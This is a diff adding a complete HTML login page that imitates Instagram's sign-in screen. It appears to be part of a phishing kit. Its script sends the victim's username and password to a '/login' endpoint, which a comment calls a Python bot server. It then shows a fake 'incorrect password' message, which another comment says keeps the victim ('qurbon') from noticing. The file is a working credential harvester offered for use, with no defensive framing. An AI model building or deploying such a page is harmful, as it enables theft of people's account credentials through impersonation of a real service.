@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 935px;
+            padding: 0 20px;
+        }
+
+        /* --- MAIN BOX --- */
+        .box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            padding: 40px 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        /* Logo */
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+
+        /* Form */
+        form {
+            width: 100%;
+        }
+
+        .input-wrap {
+            position: relative;
+            margin-bottom: 6px;
+        }
+
+        .input-wrap input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 44px 9px 8px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            transition: border-color 0.1s;
+            height: 38px;
+        }
+
+        .input-wrap input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .input-wrap input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .show-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
+            cursor: pointer;
+            display: none;
+        }
+
+        .show-btn.visible {
+            display: block;
+        }
+
+        /* Log In button */
+        .login-btn {
+            width: 100%;
+            margin-top: 8px;
+            padding: 7px 16px;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.15s;
+            height: 32px;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.3;
+            cursor: default;
+        }
+
+        /* OR divider */
+        .or-divider {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            margin: 16px 0;
+            width: 100%;
+        }
+
+        .or-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .or-text {
+            font-size: 13px;
+            font-weight: 600;
+            color: #8e8e8e;
+            letter-spacing: 1px;
+        }
+
+        /* Facebook login */
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            margin-bottom: 16px;
+        }
+
+        .fb-login:hover {
+            color: #1877f2;
+        }
+
+        .fb-login svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Forgot password */
+        .forgot {
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        .forgot a {
+            font-size: 12px;
+            color: #385185;
+            text-decoration: none;
+        }
+
+        .forgot a:hover {
+            text-decoration: underline;
+        }
+
+        /* SIGNUP BOX */
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .signup-box p {
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+        /* APP LINKS */
+        .app-links {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .app-links p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 12px;
+        }
+
+        .app-links-row {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+        }
+
+        .app-badge {
+            border: 1px solid #262626;
+            border-radius: 6px;
+            padding: 6px 12px;
+            font-size: 12px;
+            color: #262626;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .app-badge:hover {
+            background: #f2f2f2;
+        }
+
+        /* FOOTER */
+        footer {
+            text-align: center;
+            margin-top: 10px;
+            width: 100%;
+        }
+
+        footer nav {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px 12px;
+            margin-bottom: 12px;
+        }
+
+        footer nav a {
+            font-size: 12px;
+            color: #737373;
+            text-decoration: none;
+        }
+
+        footer nav a:hover {
+            text-decoration: underline;
+        }
+
+        footer p {
+            font-size: 12px;
+            color: #737373;
+        }
+
+        /* Error message */
+        .error-msg {
+            font-size: 14px;
+            color: #ed4956;
+            text-align: center;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <!-- LOGIN BOX -->
+        <div class="box">
+            <!-- Instagram SVG logo (official wordmark style) -->
+            <div class="logo">
+                <svg viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg" fill="#262626">
+                    <text x="0" y="42" font-family="'Billabong', 'Dancing Script', cursive, serif" font-size="44"
+                        fill="#262626">mening sitem</text>
+                </svg>
+            </div>
+
+            <form onsubmit="handleLogin(event)">
+                <div class="input-wrap">
+                    <input type="text" id="username" placeholder="Phone number, username, or email"
+                        autocomplete="username" oninput="checkForm()">
+                </div>
+
+                <div class="input-wrap">
+                    <input type="password" id="password" placeholder="Password" autocomplete="current-password"
+                        oninput="checkForm(); toggleShowBtn()">
+                    <button type="button" class="show-btn" id="showBtn" onclick="togglePass()">Show</button>
+                </div>
+
+                <div class="error-msg" id="errorMsg">
+                    Sorry, your password was incorrect. Please double-check your password.
+                </div>
+
+                <button class="login-btn" id="loginBtn" type="submit" disabled>Log in</button>
+            </form>
+
+            <div class="or-divider">
+                <div class="or-line"></div>
+                <div class="or-text">OR</div>
+                <div class="or-line"></div>
+            </div>
+
+            <a class="fb-login" href="#">
+                <svg viewBox="0 0 24 24" fill="#385185" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                        d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+                </svg>
+                Log in with Facebook
+            </a>
+
+            <div class="forgot">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+
+        <!-- SIGNUP BOX -->
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <!-- APP LINKS -->
+        <div class="app-links">
+            <p>Get the app.</p>
+            <div class="app-links-row">
+                <a class="app-badge" href="#">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
+                    </svg>
+                    App Store
+                </a>
+                <a class="app-badge" href="#">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M3.18 23.76c.3.17.64.24.99.2l12.45-12.45L13.07 8l-9.89 15.76zM20.51 10.19l-2.83-1.63-3.19 3.19 3.19 3.18 2.86-1.65c.82-.47.82-1.62-.03-2.09zM2.02 1.27C1.99 1.42 2 1.59 2 1.76v20.48c0 .18.01.35.06.49L14.14 10.1 2.02 1.27zM16.63 3.07L4.18.24c-.36-.07-.71 0-1 .18L15.61 12l3.24-3.24-2.22-5.69z" />
+                    </svg>
+                    Google Play
+                </a>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <footer>
+            <nav>
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+                <a href="#">Meta Verified</a>
+            </nav>
+            <p>© 2025 Instagram from Meta</p>
+        </footer>
+
+    </div>
+
+    <script>
+        // Use Google Font for the logo
+        const link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.href = 'https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap';
+        document.head.appendChild(link);
+        document.querySelector('.logo svg text').style.fontFamily = "'Dancing Script', cursive";
+
+        function checkForm() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            document.getElementById('loginBtn').disabled = !(u.trim() && p.trim());
+        }
+
+        function toggleShowBtn() {
+            const p = document.getElementById('password').value;
+            const btn = document.getElementById('showBtn');
+            btn.classList.toggle('visible', p.length > 0);
+        }
+
+        function togglePass() {
+            const inp = document.getElementById('password');
+            const btn = document.getElementById('showBtn');
+            if (inp.type === 'password') {
+                inp.type = 'text';
+                btn.textContent = 'Hide';
+            } else {
+                inp.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        function handleLogin(e) {
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+
+            // Ma'lumotni Python bot serveriga /login manziliga yuboramiz
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: u,
+                    password: p
+                })
+            })
+                .then(response => {
+                    // Jo'natilgandan so'ng xatolikni ko'rsatish (qurbon sezmasligi uchun)
+                    const err = document.getElementById('errorMsg');
+                    err.classList.add('show');
+                    setTimeout(() => err.classList.remove('show'), 3000);
+                })
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+
+</html>
